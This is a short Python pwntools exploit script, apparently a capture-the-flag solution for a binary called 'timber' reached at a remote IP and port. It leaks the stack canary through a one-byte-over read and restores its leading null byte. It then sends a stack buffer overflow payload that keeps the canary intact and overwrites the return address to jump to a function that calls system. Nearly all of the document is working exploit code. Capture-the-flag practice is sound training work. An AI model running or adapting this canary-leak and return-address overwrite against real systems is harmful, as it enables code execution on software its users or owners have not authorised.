#!/usr/bin/python
from pwn import *
#______________________________________________________________________________________________________________
rem = "18.222.250.47 12345"
cmd = "./timber"
local = 0
#______________________________________________________________________________________________________________
if bool(local): p = process(cmd.split(' ')); raw_input("-PID");
else: rem = rem.split(' '); p = remote(rem[0], rem[1])
#______________________________________________________________________________________________________________
p.recv()

# Leak canary. 
# buf-size+1 b/c stack canary starts with 00
ln = 61
p.send("A"*ln)
p.recvuntil("Alright ")

# Parse canary
can = p.recv()[ln-1:][:4]
ls = list(can)
ls[0] = '\x00'
can = "".join(ls)

# Just for the program. No exploit
p.sendline('s')

# Address to the function that calls system
date = 0x804867b
# Overflow 
payload = "B"*48 + can + "C"*8 + p32(date)
p.send(payload)
print p.recvall()

#______________________________________________________________________________________________________________
if bool(local): raw_input("-END")
p.close()
